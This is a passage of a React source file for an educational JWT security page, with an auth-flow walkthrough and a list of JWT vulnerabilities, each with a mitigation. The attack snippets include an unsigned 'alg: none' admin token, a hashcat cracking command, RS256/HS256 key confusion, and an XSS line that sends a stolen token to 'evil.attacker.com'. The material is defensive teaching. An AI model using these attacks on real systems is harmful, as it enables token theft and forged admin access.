                <button onClick={generateToken} className="w-full py-3.5 rounded-2xl bg-indigo-600 hover:bg-indigo-500 text-white font-bold text-sm transition-all active:scale-95 shadow-lg shadow-indigo-500/20">
                  Generate Token
                </button>
              </div>

              <div className="space-y-4">
                {encoded ? (
                  <>
                    <div className="glass p-6 rounded-[32px] border-white/5 space-y-4">
                      <div className="flex justify-between items-center">
                        <h3 className="text-sm font-black uppercase tracking-widest text-gray-500">Generated JWT</h3>
                        <button onClick={copyToken} className="flex items-center gap-1.5 text-[11px] text-gray-500 hover:text-white transition-colors">
                          <Copy className="w-3 h-3" /> {copied ? "Copied!" : "Copy"}
                        </button>
                      </div>
                      <div className="font-mono text-[10px] leading-7 break-all bg-black/40 p-5 rounded-2xl border border-white/5">
                        {(() => {
                          const parts = encoded.split(".")
                          return <><span className="text-rose-400">{parts[0]}</span><span className="text-gray-700">.</span><span className="text-violet-400">{parts[1]}</span><span className="text-gray-700">.</span><span className="text-blue-400">{parts[2]}</span></>
                        })()}
                      </div>
                    </div>
                    {(() => {
                      const d = parseJWT(encoded)
                      if (!d) return null
                      return (
                        <div className="glass p-6 rounded-[24px] border-white/5 space-y-3">
                          <h4 className="text-[10px] font-black uppercase tracking-widest text-gray-600">Decoded Confirmation</h4>
                          <div className="bg-black/40 p-4 rounded-xl border border-rose-500/10">
                            <p className="text-[9px] text-rose-400 font-black uppercase mb-1">Header</p>
                            <pre className="text-xs text-rose-300 font-mono">{JSON.stringify(d.header, null, 2)}</pre>
                          </div>
                          <div className="bg-black/40 p-4 rounded-xl border border-violet-500/10">
                            <p className="text-[9px] text-violet-400 font-black uppercase mb-1">Payload</p>
                            <pre className="text-xs text-violet-300 font-mono">{JSON.stringify(d.payload, null, 2)}</pre>
                          </div>
                        </div>
                      )
                    })()}
                  </>
                ) : (
                  <div className="glass p-16 rounded-[32px] border-white/5 flex flex-col items-center text-center gap-3 opacity-20">
                    <Code2 className="w-10 h-10" />
                    <p className="text-sm font-bold uppercase tracking-widest">Configure &amp; generate</p>
                  </div>
                )}
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  )
}

/* ════════════════════ AUTH FLOW ════════════════════ */
const FLOW_STEPS = [
  {
    id: 1, from: "User (Browser)", to: "Client App / API",
    action: "POST /login\n{\n  email: alice@example.com,\n  password: ••••••••\n}",
    title: "User submits credentials",
    desc: "The user enters their credentials and submits the login form. The request is sent over HTTPS to prevent interception.",
    detail: "The password should never be stored in plaintext — the server hashes it (bcrypt/argon2) before comparing with what's in the database.",
    fromIcon: "user", toIcon: "server",
  },
  {
    id: 2, from: "Client App / API", to: "Database",
    action: "SELECT user WHERE email='alice'\nVERIFY bcrypt(password, stored_hash)",
    title: "Server verifies credentials",
    desc: "The API looks up the user by email and verifies the password against the stored bcrypt hash.",
    detail: "This is the ONLY database query in the entire JWT auth flow. After this, the server mints a token and no further DB lookups are needed for auth.",
    fromIcon: "server", toIcon: "database",
  },
  {
    id: 3, from: "Client App / API", to: "Client (Browser)",
    action: "HTTP 200 OK\n{\n  accessToken:  \"eyJhbGci...\",\n  refreshToken: \"dGhpcyBp...\"\n}",
    title: "Server mints and returns tokens",
    desc: "If credentials are valid, the server creates two tokens: a short-lived access token and a long-lived refresh token.",
    detail: "Access token: expires in 15–60 min, stored in memory. Refresh token: expires in days/weeks, stored in HttpOnly cookie to prevent XSS theft.",
    fromIcon: "server", toIcon: "user",
  },
  {
    id: 4, from: "Client (Browser)", to: "API Resource Server",
    action: "GET /api/profile\nAuthorization: Bearer eyJhbGciOiJIUzI...\n     <accessToken>",
    title: "API request with Bearer token",
    desc: "Every subsequent API request attaches the access token in the Authorization header. The API verifies it locally — no DB lookup.",
    detail: "The server splits the token, recomputes the HMAC signature, checks exp/iss/aud claims. All done in memory in microseconds.",
    fromIcon: "user", toIcon: "server",
  },
  {
    id: 5, from: "Client (Browser)", to: "Auth Server",
    action: "POST /token/refresh\n{\n  refreshToken: \"dGhpcyBpcyBhIHJl...\"\n}",
    title: "Silent token refresh (when expired)",
    desc: "When the access token expires (401 response), the client silently sends the refresh token to get a new access token — no re-login.",
    detail: "A good auth library (like auth.js or Axios interceptors) does this automatically, completely transparently to the user.",
    fromIcon: "user", toIcon: "lock",
  },
  {
    id: 6, from: "Auth Server", to: "Client (Browser)",
    action: "HTTP 200 OK\n{\n  accessToken: \"eyJhbGciOiJIUzI...\",\n  expiresIn: 3600\n}",
    title: "Fresh access token issued",
    desc: "A new access token is returned and replaces the old one. The user never noticed the seamless refresh.",
    detail: "If the refresh token itself is expired or revoked, the server returns 401 and the user must log in again. This is when sessions end.",
    fromIcon: "lock", toIcon: "user",
  },
]

function FlowIcon({ type }: { type: string }) {
  const cls = "w-7 h-7"
  if (type === "user") return <User className={cn(cls, "text-emerald-400")} />
  if (type === "database") return <Zap className={cn(cls, "text-amber-400")} />
  if (type === "lock") return <Lock className={cn(cls, "text-violet-400")} />
  return <Server className={cn(cls, "text-blue-400")} />
}

function JWTFlow() {
  const [step, setStep] = useState(0)
  const current = FLOW_STEPS[step]

  return (
    <div className="space-y-6">
      <div className="glass p-6 rounded-[32px] border-white/5 space-y-4">
        <div className="flex gap-1">
          {FLOW_STEPS.map((s, i) => (
            <button key={s.id} onClick={() => setStep(i)} className={cn("flex-1 h-1.5 rounded-full transition-all", i === step ? "bg-indigo-500" : i < step ? "bg-indigo-500/40" : "bg-white/10")} />
          ))}
        </div>
        <div className="flex justify-between items-center">
          <p className="text-[10px] font-black uppercase tracking-widest text-gray-600">Step {step + 1} / {FLOW_STEPS.length} — {current.title}</p>
          <div className="flex gap-2">
            <button onClick={() => setStep(s => Math.max(0, s - 1))} disabled={step === 0} className="px-4 py-1.5 rounded-full bg-white/5 border border-white/10 text-xs text-gray-500 hover:text-white transition-all disabled:opacity-30">← Prev</button>
            <button onClick={() => setStep(s => Math.min(FLOW_STEPS.length - 1, s + 1))} disabled={step === FLOW_STEPS.length - 1} className="px-4 py-1.5 rounded-full bg-indigo-600 border border-indigo-400 text-xs text-white hover:bg-indigo-500 transition-all disabled:opacity-30">Next →</button>
          </div>
        </div>
      </div>

      <AnimatePresence mode="wait">
        <motion.div key={step} initial={{ opacity: 0, x: 40 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -40 }} transition={{ duration: 0.22 }}>
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
            <div className="glass p-8 rounded-[32px] border-white/5 flex flex-col items-center justify-center text-center gap-3">
              <div className="w-16 h-16 rounded-full bg-white/5 border border-white/10 flex items-center justify-center">
                <FlowIcon type={current.fromIcon} />
              </div>
              <p className="text-sm font-black text-gray-300">{current.from}</p>
            </div>
            <div className="glass p-6 rounded-[32px] border-indigo-500/10 bg-indigo-500/5 flex flex-col items-center justify-center gap-4">
              <ArrowRight className="w-8 h-8 text-indigo-400 animate-pulse" />
              <pre className="bg-black/40 px-4 py-3 rounded-2xl border border-white/5 font-mono text-xs text-gray-300 text-left w-full whitespace-pre-wrap leading-relaxed">{current.action}</pre>
            </div>
            <div className="glass p-8 rounded-[32px] border-white/5 flex flex-col items-center justify-center text-center gap-3">
              <div className="w-16 h-16 rounded-full bg-white/5 border border-white/10 flex items-center justify-center">
                <FlowIcon type={current.toIcon} />
              </div>
              <p className="text-sm font-black text-gray-300">{current.to}</p>
            </div>
          </div>
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 mt-6">
            <div className="glass p-6 rounded-[24px] border-white/5 space-y-2">
              <p className="text-[10px] font-black uppercase tracking-widest text-gray-600">What&apos;s happening</p>
              <p className="text-sm text-gray-300 leading-relaxed">{current.desc}</p>
            </div>
            <div className="glass p-6 rounded-[24px] border-indigo-500/10 space-y-2">
              <p className="text-[10px] font-black uppercase tracking-widest text-indigo-500">Technical detail</p>
              <p className="text-sm text-gray-400 leading-relaxed">{current.detail}</p>
            </div>
          </div>
        </motion.div>
      </AnimatePresence>
    </div>
  )
}

/* ════════════════════ VULNERABILITIES ════════════════════ */
const VULNS = [
  {
    id: "alg-none", severity: "CRITICAL", color: "red",
    title: 'Algorithm Confusion: alg: "none"',
    summary: "If the server honors the algorithm specified in the token header, an attacker can set alg to 'none', strip the signature, and the server accepts the forged token.",
    attack: `// Attacker modifies header to:\n{ "alg": "none", "typ": "JWT" }\n\n// Builds a token without any signature:\neyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.\n//                                                                 ^^^ empty signature!\n\n// Server that accepts 'none' algorithm\n// grants full admin access.`,
    mitigation: "Explicitly allowlist algorithms server-side. Never let the token's own header dictate which algorithm the server uses to verify it. Reject tokens where alg does not match configuration.",
  },
  {
    id: "missing-aud", severity: "HIGH", color: "orange",
    title: "Missing Audience (aud) Claim",
    summary: "Without an aud claim, a JWT issued for Service A can be replayed against Service B if both services trust the same issuer — enabling unauthorized cross-service access.",
    attack: `// Token issued for Service A (no aud):\n{ "sub": "user_1", "iss": "auth.company.com" }\n\n// Service B trusts "auth.company.com" as issuer.\n// Attacker presents Service A's token to Service B.\n// Service B finds no audience conflict — ACCEPTED!\n\n// Attacker now accesses Service B\n// with user_1's identity.`,
    mitigation: "Always include aud. Each service must only accept tokens where aud matches its own identifier (e.g., 'api.orders.company.com'). Validate aud on every request.",
  },
  {
    id: "weak-secret", severity: "HIGH", color: "orange",
    title: "Weak HMAC Signing Secret",
    summary: "HMAC-signed JWTs can be cracked offline if the secret is weak or short. An attacker who captures any JWT can attempt to brute-force the secret using wordlists.",
    attack: `# Capture any JWT from traffic or logs.\n# Run hashcat in JWT cracking mode:\nhashcat -a 0 -m 16500 token.jwt rockyou.txt\n\n# If secret = "secret" or "password123":\n# Cracked in seconds on consumer GPU.\n\n# Attacker now signs ANY claims:\ncustom_token = sign({ role: "admin" }, cracked_secret)`,
    mitigation: "Use at least 256 bits (32 bytes) of cryptographically random secret (e.g., openssl rand -hex 32). Better: use RS256/ES256 (asymmetric) — there is no shared secret to steal.",
  },
  {
    id: "no-exp", severity: "MEDIUM", color: "yellow",
    title: "No Expiration (exp) Claim",
    summary: "A JWT without an expiration timestamp is valid forever. If stolen — via XSS, logs, or network interception — an attacker has permanent access with no built-in revocation.",
    attack: `// Token with no exp:\n{ "sub": "user_1", "role": "admin" }\n// No "exp" field — valid indefinitely.\n\n// If this token is ever leaked:\n// - In a log file\n// - Via XSS\n// - Exposed in a URL\n// The attacker has permanent admin access.`,
    mitigation: "Always set exp. Use short-lived access tokens (5–60 min) and refresh tokens for renewed access. For sensitive operations, combine exp with a jti blocklist in Redis.",
  },
  {
    id: "storage", severity: "MEDIUM", color: "yellow",
    title: "Insecure Storage (localStorage)",
    summary: "Storing JWTs in localStorage or sessionStorage makes them accessible to any JavaScript on the page — including injected malicious scripts (XSS).",
    attack: `// Any XSS payload on your site can run:\nconst token = localStorage.getItem('jwt');\nfetch('https://evil.attacker.com/steal', {\n  method: 'POST',\n  body: token\n});\n\n// Attacker now has full access until token expires.\n// No interaction required beyond the XSS vector.`,
    mitigation: "Store access tokens in JavaScript memory (a React state/context variable) — lost on refresh but safe from XSS. Store refresh tokens in HttpOnly, Secure, SameSite=Strict cookies.",
  },
  {
    id: "alg-confusion", severity: "HIGH", color: "orange",
    title: "RS256 → HS256 Algorithm Confusion",
    summary: "If a server supports both RS256 and HS256, an attacker can take the public key (which is public!) and use it as the HMAC secret to sign a forged token that the server will accept.",
    attack: `// Normal: Server signs with RSA private key.\n// Public key is available at /jwks.json.\n\n// Attack:\n// 1. Fetch public key from server\n// 2. Sign forged payload with HS256\n//    using the PUBLIC KEY as the HMAC secret\nforged = HMACSHA256(\n  header_with_alg_HS256 + "." + forged_payload,\n  PUBLIC_KEY  // <-- the hmac "secret"\n)\n// 3. Server validates HS256 with the public key\n// 4. Signature matches → ACCEPTED`,
    mitigation: "Pin algorithms explicitly in server config — never accept multiple. Reject tokens where the header algorithm doesn't match the expected one. Use a battle-tested JWT library that doesn't allow this.",
  },
]

function JWTVulnerabilities() {
  const [expanded, setExpanded] = useState<string | null>("alg-none")
  const severityBadge = (s: string) => s === "CRITICAL" ? "bg-red-500/20 text-red-400 border-red-500/30" : s === "HIGH" ? "bg-orange-500/20 text-orange-400 border-orange-500/30" : "bg-yellow-500/20 text-yellow-400 border-yellow-500/30"
  const cardBorder = (c: string) => c === "red" ? "border-red-500/20 hover:border-red-500/40" : c === "orange" ? "border-orange-500/20 hover:border-orange-500/40" : "border-yellow-500/20 hover:border-yellow-500/40"

  return (
    <div className="space-y-4">
      <div className="glass p-5 rounded-2xl border-white/5 flex gap-3 mb-6">
        <ShieldAlert className="w-5 h-5 text-red-400 shrink-0 mt-0.5" />
        <p className="text-sm text-gray-400 leading-relaxed">
          JWTs are cryptographically sound in theory, but many common implementation mistakes create serious vulnerabilities. Every attack below is a <strong className="text-white">real, documented CVE or attack class</strong> seen in production systems.
        </p>
      </div>
      {VULNS.map(v => (
        <motion.div key={v.id} layout className={cn("glass rounded-[24px] border overflow-hidden transition-colors", cardBorder(v.color))}>
          <button onClick={() => setExpanded(expanded === v.id ? null : v.id)} className="w-full p-5 flex items-start gap-4 text-left">
            <span className={cn("px-2.5 py-1 rounded-lg text-[10px] font-black border shrink-0 mt-0.5", severityBadge(v.severity))}>{v.severity}</span>
            <div className="flex-1">
              <h3 className="text-sm font-bold mb-1">{v.title}</h3>
              <p className="text-[12px] text-gray-500 leading-relaxed">{v.summary}</p>
            </div>
            <ChevronRight className={cn("w-4 h-4 text-gray-600 shrink-0 mt-1 transition-transform", expanded === v.id && "rotate-90")} />
          </button>
          <AnimatePresence>
            {expanded === v.id && (
              <motion.div initial={{ height: 0 }} animate={{ height: "auto" }} exit={{ height: 0 }} className="overflow-hidden">
                <div className="px-5 pb-6 space-y-4 border-t border-white/5 pt-4">
                  <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
                    <div className="space-y-2">
                      <p className="text-[10px] font-black uppercase tracking-widest text-red-500">Attack Vector</p>
                      <pre className="bg-black/60 border border-red-500/10 rounded-xl p-4 text-xs font-mono text-red-300 whitespace-pre-wrap leading-relaxed">{v.attack}</pre>
                    </div>
                    <div className="space-y-2">
                      <p className="text-[10px] font-black uppercase tracking-widest text-emerald-500">Mitigation</p>
                      <div className="bg-emerald-500/5 border border-emerald-500/10 rounded-xl p-4 text-[13px] text-emerald-300/80 leading-relaxed">{v.mitigation}</div>
                    </div>
                  </div>
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </motion.div>
      ))}
    </div>
  )
}
